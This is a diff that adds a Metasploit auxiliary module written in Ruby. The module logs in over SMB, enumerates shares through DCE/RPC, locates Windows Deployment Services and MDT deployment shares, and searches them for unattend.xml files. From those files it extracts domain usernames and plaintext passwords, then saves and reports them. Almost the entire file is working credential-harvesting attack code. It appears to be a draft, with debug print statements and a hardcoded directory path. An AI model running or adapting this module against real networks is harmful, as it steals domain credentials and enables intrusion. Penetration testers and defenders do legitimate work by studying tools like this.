@@ -1,0 +1,282 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
+require 'msf/core'
+require 'rex/proto/dcerpc'
+require 'rex/proto/dcerpc/wdscp'
+require 'rex/parser/unattend'
+
+class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::Remote::SMB
+	include Msf::Exploit::Remote::SMB::Authenticated
+	include Msf::Exploit::Remote::DCERPC
+	
+	include Msf::Auxiliary::Report
+	include Msf::Auxiliary::Scanner
+	
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Microsoft Windows Deployment Services Unattend Gatherer',
+			'Description'    => %q{
+						Used after discovering  domain credentials with aux/scanner/dcerpc/windows_deployment_services
+						or if you already have  domain credentials. Will attempt to connect to the RemInst share and any 
+						Microsoft Deployment Toolkit shares, search for unattend files, and recover credentials.
+			},
+			'Author'         => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '',
+			'References'     =>
+				[
+					[ 'MSDN', 'http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx'],
+				],
+			'DisclosureDate' => 'N/A',
+			))
+
+		register_options(
+			[
+				Opt::RPORT(445),
+			], self.class)
+		
+		deregister_options('RHOST', 'CHOST', 'CPORT', 'SSL', 'SSLVersion')
+	end
+	
+	# Move this to mixin?
+	def share_type(val)
+			stypes = [
+					'DISK',
+					'PRINTER',
+					'DEVICE',
+					'IPC',
+					'SPECIAL',
+					'TEMPORARY'
+			]
+
+			if val > (stypes.length - 1)
+					return 'UNKNOWN'
+			end
+
+			stypes[val]
+	end
+	
+	# move this and lanmanenum to simple client?
+	def srvsvc_netshareenum
+			simple.connect("IPC$")
+			handle = dcerpc_handle('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0', 'ncacn_np', ["\\srvsvc"])
+			begin
+					dcerpc_bind(handle)
+			rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
+					print_error("#{rhost} : #{e.message}")
+					return
+			end
+
+			stubdata =
+					NDR.uwstring("\\\\#{rhost}") +
+					NDR.long(1)  #level
+
+			ref_id = stubdata[0,4].unpack("V")[0]
+			ctr = [1, ref_id + 4 , 0, 0].pack("VVVV")
+
+			stubdata << ctr
+			stubdata << NDR.align(ctr)
+			stubdata << ["FFFFFFFF"].pack("H*")
+			stubdata << [ref_id + 8, 0].pack("VV")
+			response = dcerpc.call(0x0f, stubdata)
+			res = response.dup
+			win_error = res.slice!(-4, 4).unpack("V")[0]
+			if win_error != 0
+					raise "DCE/RPC error : Win_error = #{win_error + 0}"
+			end
+			#remove some uneeded data
+			res.slice!(0,12) # level, CTR header, Reference ID of CTR
+			share_count = res.slice!(0, 4).unpack("V")[0]
+			res.slice!(0,4) # Reference ID of CTR1
+			share_max_count = res.slice!(0, 4).unpack("V")[0]
+
+			raise "Dce/RPC error : Unknow situation encountered count != count max (#{share_count}/#{share_max_count})" if share_max_count != share_count
+
+			types = res.slice!(0, share_count * 12).scan(/.{12}/n).map{|a| a[4,2].unpack("v")[0]}  # RerenceID / Type / ReferenceID of Comment
+
+			share_count.times do |t|
+					length, offset, max_length = res.slice!(0, 12).unpack("VVV")
+					raise "Dce/RPC error : Unknow situation encountered offset != 0 (#{offset})" if offset != 0
+					raise "Dce/RPC error : Unknow situation encountered length !=max_length (#{length}/#{max_length})" if length != max_length
+					name = res.slice!(0, 2 * length).gsub('\x00','')
+					res.slice!(0,2) if length % 2 == 1 # pad
+
+					comment_length, comment_offset, comment_max_length = res.slice!(0, 12).unpack("VVV")
+					raise "Dce/RPC error : Unknow situation encountered comment_offset != 0 (#{comment_offset})" if comment_offset != 0
+					if comment_length != comment_max_length
+							raise "Dce/RPC error : Unknow situation encountered comment_length != comment_max_length (#{comment_length}/#{comment_max_length})"
+					end
+					comment = res.slice!(0, 2 * comment_length).gsub('\x00','')
+					res.slice!(0,2) if comment_length % 2 == 1 # pad
+
+					@shares << [ name, share_type(types[t]), comment]
+			end
+	end
+
+	def run_host(ip)
+	
+			@shares = []
+			deploy_shares = []
+			
+			begin
+				connect
+				smb_login
+				srvsvc_netshareenum
+
+				@shares.each do |share|
+					# I hate unicode, couldn't find any other way to get these to compare!
+					if (share[0].unpack('H*') == "REMINST\x00".encode('utf-16LE').unpack('H*')) ||
+						(share[2].unpack('H*') == "MDT Deployment Share\x00".encode('utf-16LE').unpack('H*'))
+						
+						print_status("#{ip}:#{rport} #{share[0]} - #{share[1]} - #{share[2]}")
+						deploy_shares << share[0]
+					end
+				end
+				
+				deploy_shares.each do |deploy_share|
+					query_share(ip, deploy_share)
+				end
+
+			rescue ::Interrupt
+					raise $!
+			end
+	end
+	
+	# To live in SMB Constants?
+	FILE_ATTR_READ_ONLY = 1
+	FILE_ATTR_HIDDEN = 2
+	FILE_ATTR_SYSTEM = 4
+	FILE_ATTR_VOL_ID = 8
+	FILE_ATTR_DIR = 16
+	FILE_ATTR_ARCHIVE = 32
+	FILE_ATTR_DEVICE = 64
+	FILE_ATTR_NORMAL = 128
+	FILE_ATTR_TEMP = 256
+	FILE_ATTR_SPARSE = 512
+	FILE_ATTR_REPARSE = 1024
+	FILE_ATTR_COMPRESSED = 2048
+	FILE_ATTR_OFFLINE = 4096
+	FILE_ATTR_CONTENT_INDEXED = 8192
+	FILE_ATTR_ENCRYPTED = 16384
+	
+	def search_share(current_path, regex)
+		puts current_path
+		results = simple.client.find_first("#{current_path}*")
+		files = []
+		
+		results.each do |result|
+			if result[0] =~ /^(\.){1,2}$/ 
+				next
+			end
+
+			if result[1]['attr'] & FILE_ATTR_DIR > 0
+				files << search_share("#{current_path}#{result[0]}\\", regex)
+			else
+				if result[0] =~ regex
+					files << "#{current_path}\\#{result[0]}"
+				end
+			end
+		end
+	
+		puts "Files #{files}"
+		
+		return files.flatten			
+	end
+	
+	def query_share(rhost, deploy_share)
+		print_status("Enumerating \\\\#{rhost}\\#{deploy_share}")
+		table = Rex::Ui::Text::Table.new({
+                        'Header' => 'Windows Deployment Services Shares',
+                        'Indent' => 1,
+                        'Columns' => ['Path', 'Domain', 'Username', 'Password']
+        })
+		
+		creds_found = false
+		share = deploy_share.force_encoding('utf-16LE').encode('ASCII-8BIT').strip
+	
+		begin
+			simple.connect(share)
+		rescue ::Exception => e
+			print_error("\\\\#{rhost}\\#{share} - #{e}")
+			return
+		end
+		
+		current_dir = "\\Control\\1\\"
+
+		search_share("\\", /unattend.xml$/i)
+		begin
+			results = simple.client.find_first("*.*")
+		rescue ::Exception => e
+			print_error("\\\\#{rhost}\\#{share} no files found")
+			return
+		end
+		
+		results.each do |result|
+			file_path = "#{current_dir}#{result[0]}"
+			file = simple.open(file_path, 'o').read()
+			
+			unless file.nil?
+				loot_unattend(file)
+
+				creds = parse_client_unattend(file)
+				creds.each do |cred|
+					unless cred.empty?
+						unless cred['username'].nil? || cred['password'].nil?
+							print_good("Retrived #{cred['type']} credentials from #{file_path}")
+							creds_found = true
+							domain = ""
+							domain = cred['domain'] if cred['domain']
+							report_creds(domain, cred['username'], cred['password'])
+							table << [file_path, domain, cred['username'], cred['password']]
+						end
+					end
+				end
+			end
+		end
+		
+		if creds_found
+			print_line
+			table.print 
+			print_line
+		else
+			print_error("No Unattend files found.")
+		end
+	end
+	
+	def parse_client_unattend(data)
+		begin
+			xml = REXML::Document.new(data)
+
+			rescue REXML::ParseException => e
+					print_error("Invalid XML format")
+					vprint_line(e.message)
+			end
+    
+		return Rex::Parser::Unattend.parse(xml).flatten
+	end
+	
+	def loot_unattend(data)
+			return if data.empty?	
+			p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, "Windows Deployment Services")
+			print_status("Raw version saved as: #{p}")
+	end
+	
+	def report_creds(domain, user, pass)
+		report_auth_info(
+				:host  => rhost,
+				:port => 445,
+				:sname => 'smb',
+				:proto => 'tcp',
+				:source_id => nil,
+				:source_type => "aux",
+				:user => "#{domain}\\#{user}",
+				:pass => pass)
+	end
+end
